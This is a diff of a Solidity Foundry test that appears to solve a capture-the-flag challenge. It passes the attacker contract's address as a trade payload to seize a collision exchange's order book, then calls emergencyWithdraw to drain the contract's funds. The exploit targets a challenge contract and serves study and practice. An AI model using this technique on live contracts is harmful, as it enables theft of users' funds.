@@ -19,15 +19,28 @@ contract CollisionExchangeTest is Test {
 
     function testAttack() external {
         // Initial log
-        console.log("Initial exchange balance: %s", address(collisionExchange).balance);
+        console.log(
+            "Initial exchange balance: %s",
+            address(collisionExchange).balance
+        );
 
         // Attack
-        collisionExchange.postTrade(0);
+        uint256 payload = uint256(uint160(address(this)));
+        collisionExchange.postTrade(payload);
         collisionExchange.emergencyWithdraw();
 
-        // Final log + checking
-        console.log("Final exchange balance: %s", address(collisionExchange).balance);
-        require(setup.isSolved(), "Attack failed!");
+        // Final log
+        console.log(
+            "Final exchange balance: %s",
+            address(collisionExchange).balance
+        );
+
+        // Final checks
+        require(
+            address(this) == collisionExchange.orderBook(),
+            "OrderBook attack failed!"
+        ); // Demonstrating control over which OrderBook is used
+        require(setup.isSolved(), "Attack failed!"); // Demonstrating contract funds drain
     }
 
     receive() external payable {}
